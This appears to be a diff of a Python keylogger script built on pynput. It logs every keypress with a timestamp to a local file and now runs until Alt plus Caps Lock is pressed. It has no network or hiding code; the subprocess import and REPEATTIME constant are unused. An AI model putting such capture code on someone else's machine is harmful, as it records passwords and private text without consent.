@@ -1,49 +1,43 @@
 from pynput import keyboard
 import time
 import os
+import subprocess
 
-fileName = "log.txt"
+
+
+FILENAME = "log.txt"
 # maximum file size in MB to be read
-maxFileSize = 10 * 1024
-inputDelayOnHeldSec = 0.5
-charsPerSecAfterHeld = 30
+MAXFILESIZE = 10 * 1024
+REPEATTIME = 3600
 
-lastKeyPressedTime = {}
+pressedKeys = set()
 
 def on_press(key):
-    if key == keyboard.Key.esc:
+    pressedKeys.add(key)
+
+    if ((keyboard.Key.alt_l in pressedKeys or keyboard.Key.alt_r in pressedKeys) 
+            and keyboard.Key.caps_lock in pressedKeys):
         return False
     
-    lastKeyPressedTime[key] = time.time()
-
-    if (os.path.isfile(fileName) and os.path.getsize(fileName) <= maxFileSize):
+    # append if the file exists and smaller than specified size, otherwise overwrite it.
+    if (os.path.isfile(FILENAME) and os.path.getsize(FILENAME) <= MAXFILESIZE):
         flag = "a"
     else:
         flag = "w"
-    with open(fileName, flag) as f:
+    with open(FILENAME, flag) as f:
         lastKeyPressedTimeString = time.strftime("%Y-%m-%d %H:%M:%S")
         try:
             f.write(f"{key.char} pressed at {lastKeyPressedTimeString}\n")
         except AttributeError:
+            # for non-ascii characters
             f.write(f"{key.name} pressed at {lastKeyPressedTimeString}\n")
 
 def on_release(key):
-    currentTime = time.time()
-    if (currentTime - lastKeyPressedTime[key] > inputDelayOnHeldSec):
-        print(currentTime)
-        print(lastKeyPressedTime)
-        with open(fileName, "a") as f:
-            i = ((currentTime - lastKeyPressedTime - inputDelayOnHeldSec) / charsPerSecAfterHeld)
-            currentTimeString = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(currentTime))
+    pressedKeys.remove(key)
+    
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
 
-            try:
-                f.write(f"{key.char} repeated {i} times until {currentTimeString}.\n")
-            except AttributeError:
-                f.write(f"{key.name} repeated {i} times  until {currentTimeString}\n")
-    del lastKeyPressedTime[key]
-            
-
-listener = keyboard.Listener(on_press=on_press, on_release=on_release)
-listener.start()
-time.sleep(5)
-listener.stop()
+# listener.start()
+# time.sleep(5)
+# listener.stop()
